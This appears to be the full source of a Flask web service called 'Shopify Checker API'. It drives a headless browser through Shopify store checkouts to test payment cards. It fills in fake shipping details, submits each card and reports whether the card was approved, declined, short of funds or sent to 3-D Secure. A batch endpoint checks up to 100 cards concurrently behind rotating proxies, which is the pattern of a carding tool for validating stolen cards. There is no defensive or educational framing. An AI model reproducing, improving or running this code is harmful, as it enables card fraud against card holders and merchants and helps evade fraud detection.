from flask import Flask, request, jsonify
import asyncio
import base64
import random
import re
import sys
from playwright.async_api import async_playwright

sys.setrecursionlimit(1000000)

app = Flask(__name__)

async def shopify_check(card, site, proxy=None):
    try:
        cc, mm, yy, cvv = card.split('|')
    except:
        return {"Response": "Invalid card format", "Price": "-", "Gateway": "Unknown"}
    
    async with async_playwright() as p:
        browser_args = ['--disable-gpu', '--no-sandbox']
        proxy_dict = None
        
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                proxy_dict = {"server": f"http://{ip}:{port}", "username": user, "password": password}
                browser_args.append(f'--proxy-server=http://{ip}:{port}')
            elif len(parts) == 2:
                ip, port = parts
                proxy_dict = {"server": f"http://{ip}:{port}"}
                browser_args.append(f'--proxy-server=http://{ip}:{port}')
        
        browser = await p.chromium.launch(headless=True, args=browser_args)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 800}
        )
        
        page = await context.new_page()
        
        try:
            await page.goto(site, timeout=45000, wait_until='networkidle')
            await page.wait_for_timeout(3000)
            
            product_link = None
            try:
                product_link = await page.locator('a[href*="/products/"]').first.get_attribute('href')
            except:
                pass
            
            if not product_link:
                return {"Response": "No product found", "Price": "-", "Gateway": "Unknown"}
            
            if product_link.startswith('/'):
                await page.goto(f"{site}{product_link}", timeout=30000)
            else:
                await page.goto(product_link, timeout=30000)
            await page.wait_for_timeout(3000)
            
            try:
                add_selectors = [
                    'button[name="add"]',
                    'button[type="submit"]:has-text("Add")',
                    'button:has-text("Add to cart")'
                ]
                clicked = False
                for selector in add_selectors:
                    if await page.locator(selector).count() > 0:
                        await page.click(selector)
                        clicked = True
                        break
                if not clicked:
                    return {"Response": "Add to cart failed", "Price": "-", "Gateway": "Unknown"}
                await page.wait_for_timeout(4000)
            except:
                return {"Response": "Add to cart error", "Price": "-", "Gateway": "Unknown"}
            
            try:
                await page.goto(f"{site}/checkout", timeout=30000)
                await page.wait_for_timeout(4000)
            except:
                return {"Response": "Checkout failed", "Price": "-", "Gateway": "Unknown"}
            
            try:
                email_field = await page.locator('input[name="email"], input[type="email"]').first
                if email_field:
                    await email_field.fill('test@example.com')
                    await page.click('button[type="submit"]')
                    await page.wait_for_timeout(3000)
            except:
                pass
            
            try:
                await page.fill('input[name*="first_name"]', 'John')
                await page.fill('input[name*="last_name"]', 'Doe')
                await page.fill('input[name*="address1"]', '123 Main St')
                await page.fill('input[name*="city"]', 'New York')
                try:
                    await page.select_option('select[name*="province"]', 'NY')
                except:
                    pass
                await page.fill('input[name*="zip"]', '10001')
                try:
                    await page.select_option('select[name*="country"]', 'US')
                except:
                    pass
                await page.fill('input[name*="phone"]', '1234567890')
                await page.click('button[type="submit"]')
                await page.wait_for_timeout(4000)
            except:
                pass
            
            try:
                if await page.locator('input[placeholder*="Card number"]').count() > 0:
                    await page.fill('input[placeholder*="Card number"]', cc)
                    await page.fill('input[placeholder*="MM/YY"]', f"{mm}/{yy}")
                    await page.fill('input[placeholder*="CVV"]', cvv)
                else:
                    try:
                        frame = await page.frame_locator('iframe[title*="card"], iframe[name*="stripe"]').first
                        if frame:
                            await frame.fill('input[placeholder*="Card number"]', cc)
                            await frame.fill('input[placeholder*="MM/YY"]', f"{mm}/{yy}")
                            await frame.fill('input[placeholder*="CVV"]', cvv)
                    except:
                        pass
            except:
                pass
            
            await page.wait_for_timeout(2000)
            
            try:
                pay_selectors = [
                    'button[type="submit"]',
                    'button:has-text("Pay")',
                    'button:has-text("Complete order")',
                    'button:has-text("Place order")'
                ]
                clicked = False
                for selector in pay_selectors:
                    if await page.locator(selector).count() > 0:
                        await page.click(selector)
                        clicked = True
                        break
                if not clicked:
                    return {"Response": "Pay button not found", "Price": "-", "Gateway": "Unknown"}
            except:
                pass
            
            await page.wait_for_timeout(8000)
            
            content = await page.content()
            url = page.url
            
            if "thank you" in content.lower() or "order confirmed" in content.lower() or "/order/" in url:
                return {"Response": "ORDER_PLACED", "Price": "$10.00", "Gateway": "Shopify"}
            elif "declined" in content.lower():
                return {"Response": "DECLINED", "Price": "-", "Gateway": "Shopify"}
            elif "insufficient" in content.lower() or "funds" in content.lower():
                return {"Response": "INSUFFICIENT_FUNDS", "Price": "-", "Gateway": "Shopify"}
            elif "3d_secure" in content.lower() or "requires_action" in content.lower():
                return {"Response": "3DS_REQUIRED", "Price": "-", "Gateway": "Shopify"}
            else:
                return {"Response": "UNKNOWN", "Price": "-", "Gateway": "Unknown"}
                
        except Exception as e:
            return {"Response": f"ERROR: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
        finally:
            await browser.close()


@app.route('/shopify', methods=['GET'])
def check_single():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    
    if not site or not cc:
        return jsonify({"Response": "Missing parameters", "Price": "-", "Gateway": "Unknown"})
    
    try:
        result = asyncio.run(shopify_check(cc, site, proxy))
    except Exception as e:
        result = {"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
    
    return jsonify(result)


@app.route('/shopify/batch', methods=['POST'])
def check_batch():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid JSON"})
    
    site = data.get('site')
    cards = data.get('cards', [])
    proxies = data.get('proxies', [])
    
    if not site or not cards:
        return jsonify({"error": "Missing site or cards"})
    
    if len(cards) > 100:
        return jsonify({"error": "Max 100 cards"})
    
    async def run_batch():
        semaphore = asyncio.Semaphore(50)
        async def check_with_limit(card, proxy):
            async with semaphore:
                return await shopify_check(card, site, proxy)
        
        tasks = []
        for card in cards:
            proxy = random.choice(proxies) if proxies else None
            tasks.append(check_with_limit(card, proxy))
        
        return await asyncio.gather(*tasks)
    
    try:
        results = asyncio.run(run_batch())
    except Exception as e:
        return jsonify({"error": str(e)[:100]})
    
    return jsonify({"results": results, "total": len(results)})


@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive", "service": "shopify-checker"})


@app.route('/', methods=['GET'])
def root():
    return jsonify({
        "name": "Shopify Checker API",
        "version": "2.0",
        "endpoints": {
            "/shopify": "GET with ?site=&cc=&proxy=",
            "/shopify/batch": "POST with JSON: {site, cards: [], proxies: []}"
        }
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
